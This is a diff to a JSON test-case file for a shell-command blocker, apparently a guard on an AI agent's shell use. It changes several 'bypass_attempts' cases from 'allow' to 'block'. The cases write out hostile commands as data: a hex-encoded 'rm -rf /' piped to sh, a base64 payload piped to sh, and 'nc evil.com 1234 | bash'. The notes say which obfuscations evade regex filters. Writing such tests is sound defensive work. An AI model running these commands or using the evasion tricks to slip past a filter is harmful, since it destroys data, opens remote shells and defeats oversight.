@@ -62,7 +62,7 @@
       "expected": "allow",
       "severity": "high",
       "bypass_methods": [],
-      "note": "String concatenation in shell is hard to detect — should block but may not"
+      "note": "String concatenation in shell is hard to detect \u2014 should block but may not"
     },
     {
       "id": "bypass-008",
@@ -116,20 +116,20 @@
       "category": "bypass_attempts",
       "description": "Decode and execute via xxd",
       "command": "echo 726d202d7266202f | xxd -r -p | sh",
-      "expected": "allow",
+      "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "xxd pipe sh bypass — hard to detect with regex"
+      "note": "xxd pipe sh bypass \u2014 hard to detect with regex"
     },
     {
       "id": "bypass-014",
       "category": "bypass_attempts",
       "description": "openssl decode and execute",
       "command": "echo d2hvYW1p | openssl base64 -d | sh",
-      "expected": "allow",
+      "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "openssl base64 pipe sh — encode variant"
+      "note": "openssl base64 pipe sh \u2014 encode variant"
     },
     {
       "id": "bypass-015",
@@ -148,7 +148,7 @@
       "expected": "allow",
       "severity": "high",
       "bypass_methods": [],
-      "note": "sed transformation pipe — hard to detect statically"
+      "note": "sed transformation pipe \u2014 hard to detect statically"
     },
     {
       "id": "bypass-017",
@@ -174,10 +174,10 @@
       "category": "bypass_attempts",
       "description": "nc-based remote execution",
       "command": "nc evil.com 1234 | bash",
-      "expected": "allow",
+      "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "nc pipe bash — not in current patterns"
+      "note": "nc pipe bash \u2014 not in current patterns"
     },
     {
       "id": "bypass-020",
@@ -187,7 +187,7 @@
       "expected": "allow",
       "severity": "high",
       "bypass_methods": [],
-      "note": "DNS pipe shell — exotic bypass vector"
+      "note": "DNS pipe shell \u2014 exotic bypass vector"
     }
   ]
 }
